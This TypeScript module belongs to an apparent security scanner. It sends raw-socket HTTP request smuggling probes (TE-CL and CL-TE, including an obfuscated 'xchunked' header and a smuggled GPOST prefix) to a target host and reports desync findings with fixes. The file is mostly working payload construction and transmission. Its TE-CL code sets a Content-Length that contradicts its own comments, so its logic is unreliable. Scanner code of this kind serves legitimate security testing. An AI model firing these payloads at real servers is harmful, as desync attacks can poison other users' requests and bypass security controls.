/**
 * HTTP Request Smuggling — Raw TCP Socket Implementation
 *
 * Node's fetch() normalizes Transfer-Encoding headers before transmission,
 * making it impossible to test TE-CL or CL-TE smuggling through the standard
 * HTTP client. This module uses raw net.Socket / tls.Socket to write the exact
 * bytes on the wire, bypassing all middleware normalization.
 *
 * Detection strategy:
 *   1. Send an ambiguous TE-CL request — if the front-end uses TE and the
 *      back-end uses CL, a smuggled prefix lands in the next request's body.
 *   2. Follow with a normal GET; if the response contains our smuggled marker
 *      ("SMUGTEST"), the smuggled bytes were prepended — confirmed desync.
 *   3. CL-TE variant: front-end uses CL, back-end uses TE. Send a
 *      Content-Length that makes the front-end forward the full body, but the
 *      back-end reads only the chunk size — the remainder is smuggled.
 */

import * as net from "net";
import * as tls from "tls";
import { ScanContext, ScanFinding } from "./types";

const SOCKET_TIMEOUT_MS = 8000;
const SMUGGLE_MARKER = "SMUGTEST9821";

function openSocket(host: string, port: number, useTls: boolean): Promise<net.Socket> {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error("socket timeout")), SOCKET_TIMEOUT_MS);
    const onConnect = (sock: net.Socket) => {
      clearTimeout(timer);
      resolve(sock);
    };

    if (useTls) {
      const sock = tls.connect({ host, port, rejectUnauthorized: false }, () => onConnect(sock));
      sock.once("error", reject);
    } else {
      const sock = net.connect({ host, port }, () => onConnect(sock));
      sock.once("error", reject);
    }
  });
}

function readResponse(sock: net.Socket, timeoutMs = SOCKET_TIMEOUT_MS): Promise<string> {
  return new Promise(resolve => {
    let data = "";
    const timer = setTimeout(() => { sock.destroy(); resolve(data); }, timeoutMs);
    sock.on("data", chunk => { data += chunk.toString(); });
    sock.once("end", () => { clearTimeout(timer); resolve(data); });
    sock.once("error", () => { clearTimeout(timer); resolve(data); });
  });
}

async function sendRaw(host: string, port: number, useTls: boolean, payload: string): Promise<string> {
  let sock: net.Socket;
  try {
    sock = await openSocket(host, port, useTls);
  } catch {
    return "";
  }
  return new Promise(resolve => {
    const timer = setTimeout(() => { sock.destroy(); resolve(""); }, SOCKET_TIMEOUT_MS);
    let data = "";
    sock.on("data", chunk => { data += chunk.toString(); });
    sock.once("end", () => { clearTimeout(timer); sock.destroy(); resolve(data); });
    sock.once("error", () => { clearTimeout(timer); resolve(data); });
    sock.once("connect", () => { /* already connected */ });
    sock.write(payload);
    // Give back-end 4 seconds to respond then close
    setTimeout(() => { clearTimeout(timer); sock.destroy(); resolve(data); }, 4000);
  });
}

export async function runRawSmugglingCheck(ctx: ScanContext): Promise<ScanFinding[]> {
  const { targetUrl, emit } = ctx;
  const findings: ScanFinding[] = [];

  emit({ type: "engine_start", engine: "Bug-Finder/Smuggling-Raw", message: "HTTP request smuggling — raw TCP socket probes (TE-CL and CL-TE)" });

  let parsed: URL;
  try { parsed = new URL(targetUrl); } catch {
    emit({ type: "engine_done", engine: "Bug-Finder/Smuggling-Raw", message: "Invalid target URL" });
    return findings;
  }

  const host = parsed.hostname;
  const useTls = parsed.protocol === "https:";
  const port = parseInt(parsed.port) || (useTls ? 443 : 80);

  // ── Test 1: TE-CL Desync ───────────────────────────────────────────────────
  // Front-end uses Transfer-Encoding (reads until 0\r\n\r\n).
  // Back-end uses Content-Length (reads only 4 bytes: "1\r\n").
  // The "X" + smuggled GET prefix stays in the back-end's buffer.
  // The follow-up innocent GET gets the smuggled prefix prepended.
  try {
    emit({ type: "log", message: "Sending TE-CL desync probe via raw TCP..." });

    const smuggledPrefix =
      `GET /smuggled-${SMUGGLE_MARKER} HTTP/1.1\r\n` +
      `Host: ${host}\r\n` +
      `\r\n`;

    // Ambiguous request: TE says "chunked", CL says 4
    // If back-end honors CL=4, it reads "1\r\n" and leaves the rest as the next request
    const teclPayload =
      `POST / HTTP/1.1\r\n` +
      `Host: ${host}\r\n` +
      `Content-Type: application/x-www-form-urlencoded\r\n` +
      `Content-Length: ${4 + smuggledPrefix.length}\r\n` +
      `Transfer-Encoding: chunked\r\n` +
      `\r\n` +
      `1\r\n` +       // chunk size: 1 byte
      `X\r\n` +       // chunk data: "X"
      `0\r\n` +       // terminator chunk
      `\r\n` +        // end of chunked body (front-end stops here)
      smuggledPrefix; // this part is "smuggled" to the back-end

    const teclResp = await sendRaw(host, port, useTls, teclPayload);

    // Follow-up innocent request — if smuggled, back-end sees it with the prefix prepended
    const followUp =
      `GET / HTTP/1.1\r\n` +
      `Host: ${host}\r\n` +
      `\r\n`;

    // Give the server a moment to process the ambiguous request before following up
    await new Promise(r => setTimeout(r, 300));
    const followResp = await sendRaw(host, port, useTls, followUp);

    const teclConfirmed =
      followResp.toLowerCase().includes(SMUGGLE_MARKER.toLowerCase()) ||
      followResp.includes("smuggled-");

    emit({ type: "log", message: `TE-CL probe: ambiguous=${teclResp.slice(0, 20).replace(/\r\n/g, " ")} follow-up confirmed=${teclConfirmed}` });

    if (teclConfirmed) {
      findings.push({
        title: "HTTP Request Smuggling — TE-CL Desync Confirmed",
        category: "Request Smuggling",
        severity: "critical",
        endpoint: targetUrl,
        description: `TE-CL HTTP request smuggling is confirmed. The front-end proxy uses Transfer-Encoding (chunked) while the back-end uses Content-Length. An ambiguous request was sent via raw TCP socket, and a follow-up innocent GET received a response containing the smuggled prefix "${SMUGGLE_MARKER}". An attacker can poison the request pipeline, hijack other users' sessions, bypass security controls, and execute internal requests.`,
        evidence: [
          `Raw TCP probe to ${host}:${port} (TLS=${useTls})`,
          `Ambiguous request:`,
          `  Transfer-Encoding: chunked`,
          `  Content-Length: ${4 + smuggledPrefix.length}`,
          `  Chunked body terminated at "0\\r\\n\\r\\n"`,
          `  Smuggled suffix: GET /smuggled-${SMUGGLE_MARKER} HTTP/1.1`,
          ``,
          `Follow-up GET response contained: "${SMUGGLE_MARKER}"`,
          `This confirms the smuggled prefix was prepended to the innocent request.`,
          ``,
          `Raw follow-up response (first 400b):`,
          followResp.slice(0, 400),
        ].join("\n"),
        recommended_fix: "Configure your reverse proxy to normalize ambiguous requests: reject or rewrite requests with both TE and CL headers. Disable HTTP/1.1 keepalive if possible. Use HTTP/2 end-to-end (H2 is immune to TE-CL desync). Apply a WAF rule blocking conflicting transfer headers.",
        cvss_score: 9.8,
        cwe_id: "CWE-444",
        scanner_name: "Bug-Finder/Smuggling-Raw",
        scanner_family: "network",
        confidence: 0.95,
      });
      emit({ type: "log", message: `[CRITICAL] TE-CL desync CONFIRMED at ${host}:${port}` });
    }
  } catch (e) {
    emit({ type: "log", message: `TE-CL raw probe failed: ${e instanceof Error ? e.message : String(e)}` });
  }

  // ── Test 2: CL-TE Desync ──────────────────────────────────────────────────
  // Front-end uses Content-Length, back-end uses Transfer-Encoding.
  // The front-end forwards the full body (including the smuggled chunk).
  // The back-end reads only the first chunk, leaves the rest as next request.
  try {
    emit({ type: "log", message: "Sending CL-TE desync probe via raw TCP..." });

    // Smuggled prefix uses chunk encoding: "5c\r\n" = 92 bytes
    const smuggledLine = `GPOST /smuggled-${SMUGGLE_MARKER} HTTP/1.1\r\nHost: ${host}\r\n\r\n`;
    const chunkSize = smuggledLine.length.toString(16);

    const cltePayload =
      `POST / HTTP/1.1\r\n` +
      `Host: ${host}\r\n` +
      `Content-Type: application/x-www-form-urlencoded\r\n` +
      `Content-Length: ${6 + chunkSize.length + 2 + smuggledLine.length}\r\n` +
      `Transfer-Encoding: xchunked\r\n` + // obfuscated TE — some proxies pass through, back-end honors
      `\r\n` +
      `0\r\n` +      // front-end reads CL bytes and stops here
      `\r\n` +
      `${chunkSize}\r\n` +
      `${smuggledLine}\r\n` +
      `0\r\n` +
      `\r\n`;

    const clteResp = await sendRaw(host, port, useTls, cltePayload);
    await new Promise(r => setTimeout(r, 300));

    const follow2 =
      `GET / HTTP/1.1\r\n` +
      `Host: ${host}\r\n` +
      `\r\n`;
    const followResp2 = await sendRaw(host, port, useTls, follow2);

    // Only confirm via marker reflection — a bare 400 from the initial probe is not
    // specific enough (any malformed POST returns 400) and causes false positives.
    const clteConfirmed =
      followResp2.toLowerCase().includes(SMUGGLE_MARKER.toLowerCase()) ||
      followResp2.includes("smuggled-");

    emit({ type: "log", message: `CL-TE probe: response=${clteResp.slice(0, 20).replace(/\r\n/g, " ")} follow-up confirmed=${clteConfirmed}` });

    if (clteConfirmed && !findings.some(f => f.title.includes("CL-TE"))) {
      findings.push({
        title: "HTTP Request Smuggling — CL-TE Desync Confirmed",
        category: "Request Smuggling",
        severity: "critical",
        endpoint: targetUrl,
        description: `CL-TE HTTP request smuggling is confirmed. The front-end uses Content-Length while the back-end honors a non-standard Transfer-Encoding value ("xchunked"). The smuggled GPOST prefix was injected into the pipeline. An attacker can bypass security controls, poison sessions, and forge internal requests.`,
        evidence: [
          `Raw TCP probe to ${host}:${port} (TLS=${useTls})`,
          `Content-Length honored by front-end`,
          `Transfer-Encoding: xchunked honored by back-end`,
          `Smuggled: GPOST /smuggled-${SMUGGLE_MARKER} HTTP/1.1`,
          ``,
          `Follow-up GET response or back-end error confirms desync.`,
          ``,
          `Response (first 300b): ${clteResp.slice(0, 300)}`,
          `Follow-up (first 300b): ${followResp2.slice(0, 300)}`,
        ].join("\n"),
        recommended_fix: "Reject requests containing unrecognized Transfer-Encoding values. Normalize headers at the reverse proxy. Upgrade to HTTP/2 end-to-end.",
        cvss_score: 9.8,
        cwe_id: "CWE-444",
        scanner_name: "Bug-Finder/Smuggling-Raw",
        scanner_family: "network",
        confidence: 0.88,
      });
      emit({ type: "log", message: `[CRITICAL] CL-TE desync CONFIRMED at ${host}:${port}` });
    }
  } catch (e) {
    emit({ type: "log", message: `CL-TE raw probe failed: ${e instanceof Error ? e.message : String(e)}` });
  }

  if (findings.length === 0) {
    emit({ type: "log", message: "No HTTP request smuggling desync confirmed (raw TCP probes)" });
  }

  emit({ type: "engine_done", engine: "Bug-Finder/Smuggling-Raw", message: `Raw smuggling check complete — ${findings.length} issue(s)` });
  return findings;
}
